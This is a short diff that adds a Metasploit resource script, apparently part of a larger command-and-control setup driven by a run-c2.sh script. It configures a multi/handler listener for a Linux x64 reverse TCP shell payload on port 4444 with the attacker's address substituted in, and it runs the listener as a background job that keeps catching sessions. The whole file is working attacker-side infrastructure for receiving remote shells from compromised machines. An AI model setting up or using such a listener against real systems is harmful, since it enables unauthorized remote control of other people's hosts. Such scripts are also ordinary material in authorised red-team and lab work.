@@ -1,0 +1,10 @@
+# Metasploit resource script: the C2 listener (handler).
+# Started on the attacker with: msfconsole -q -r handler.rc
+# LHOST/LPORT are substituted by run-c2.sh before use.
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell_reverse_tcp
+set LHOST __LHOST__
+set LPORT 4444
+set ExitOnSession false
+# -j runs the handler as a background job so the console stays usable.
+exploit -j
